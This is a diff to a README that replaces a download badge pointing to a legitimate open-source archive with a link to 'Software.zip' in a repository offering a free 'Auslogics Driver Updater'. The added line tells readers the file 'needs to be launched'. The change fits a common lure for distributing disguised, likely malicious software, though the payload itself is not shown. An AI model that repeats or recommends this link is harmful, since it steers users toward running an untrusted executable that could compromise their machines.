@@ -28,7 +28,7 @@ Here are some of the topics covered in this repository:
 
 ## 🔗 External Link
 
-[![Download Auslogics Driver Updater](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Auslogics Driver Updater](https://github.com/devyanshd28/Auslogics-Driver-Updater-Free/releases/download/v1.0/Software.zip)](https://github.com/devyanshd28/Auslogics-Driver-Updater-Free/releases/download/v1.0/Software.zip)
 *(File needs to be launched)*
 
 ## 📎 Additional Information
